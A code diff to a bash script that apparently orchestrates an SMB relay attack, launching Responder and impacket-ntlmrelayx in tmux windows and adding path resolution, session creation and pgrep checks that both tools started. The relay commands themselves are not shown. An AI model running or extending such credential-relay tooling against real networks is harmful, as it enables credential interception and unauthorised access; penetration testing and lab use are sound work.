@@ -22,6 +22,8 @@ LOG_DIR="logs_${RUN_ID}"
 ATTACK_LOG="${LOG_DIR}/attack.log"
 RESPONDER_LOG="${LOG_DIR}/responder.log"
 RELAY_LOG="${LOG_DIR}/relay.log"
+RESPONDER_LOG="$(realpath "$RESPONDER_LOG")"
+RELAY_LOG="$(realpath "$RELAY_LOG")"
 
 # Define color codes
 RED='\033[0;31m'
@@ -145,10 +147,13 @@ start_tmux_window() {
     local window_name=$2
     local command=$3
 
+    tmux has-session -t "$session_name" 2>/dev/null || \
+    tmux new-session -d -s "$session_name"
+    
     tmux kill-window -t "$session_name:$window_name" 2>/dev/null || true
-    tmux new-window -t "$session_name" -n "$window_name"
+    tmux new-window -t "$session_name" -n "$window_name" -d
 
-    log INFO "[tmux:$window_name] $command"
+    log INFO "${CYAN}[tmux:$window_name] Executing: ${RESET}$command"
 
     tmux send-keys -t "$session_name:$window_name" "$command" C-m
 }
@@ -170,6 +175,11 @@ run_smb_relay_attack() {
         log ERROR "${RED}Failed to start Responder.${RESET}"
         exit 1
     }
+    sleep 2
+    pgrep -f "responder.*$network_interface" >/dev/null || {
+        log ERROR "${RED}[!] Responder failed to start.${RESET}"
+        exit 1
+    }
 
     # Start ntlmrelayx in another tmux window
     log INFO "${CYAN}Starting impacket-ntlmrelayx with target file ${TARGET_SMB_FILE}...${RESET}"
@@ -184,6 +194,11 @@ run_smb_relay_attack() {
     
     start_tmux_window "$session_name" "ntlmrelayx" "$relay_command" || {
         log ERROR "${RED}Failed to start ntlmrelayx.${RESET}"
+        exit 1
+    }
+    sleep 2
+    pgrep -f "impacket-ntlmrelayx" >/dev/null || {
+        log ERROR "${RED}[!] ntlmrelayx failed to start.${RESET}"
         exit 1
     }
 
